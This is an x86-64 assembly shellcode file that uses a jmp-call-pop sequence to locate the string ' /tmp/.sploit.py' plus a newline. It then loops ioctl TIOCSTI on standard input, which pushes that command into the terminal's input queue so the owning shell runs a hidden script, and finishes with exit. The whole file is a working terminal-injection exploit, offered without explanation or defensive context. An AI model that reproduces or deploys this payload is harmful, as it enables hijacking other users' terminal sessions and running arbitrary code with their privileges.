bits 64
section .text
global _start

_start:
	jmp prolog

	shellcode:
	xor rdi, rdi
	pop rdx

	push 0x5412
	pop rsi

	sys:
	push 0x10
	pop rax
	syscall
	inc rdx
	movsx ebx, byte [rdx]
	test ebx, ebx
	jne sys

	push 60
	pop rax
	xor rdi, rdi
	syscall

	db 0xff ; Needed to crash and not fall in an infinite loop

	prolog:
		call shellcode
		db ` /tmp/.sploit.py\n`
